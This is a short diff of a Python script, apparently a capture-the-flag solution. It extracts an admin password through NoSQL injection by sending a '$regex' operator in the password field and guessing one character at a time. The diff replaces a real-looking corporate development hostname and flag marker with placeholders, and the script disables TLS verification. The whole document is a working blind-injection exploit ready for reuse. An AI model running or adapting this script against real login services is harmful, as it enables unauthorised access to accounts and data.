@@ -4,7 +4,7 @@ import warnings
 
 warnings.filterwarnings("ignore")
 
-url = 'https://nosql.axa-li-jp-dev-int.pink.ap-southeast-1.aws.openpaas.axa-cloud.com/login'
+url = 'https://nosql.yourdomain.com/login'
 username = 'admin'
 password = ''
 
@@ -14,6 +14,6 @@ while True:
             payload = {"username": "{}".format(username), "password": {'$regex': "^{}".format(password + c)}}
             # payload='?username=%s&password[$regex]=^%s' % (username, password + c)
             r = requests.post(url, json=payload, verify=False)
-            if 'axactf' in r.text:
+            if 'companyctf' in r.text:
                 print("Found one more char : {}".format(password+c))
                 password += c
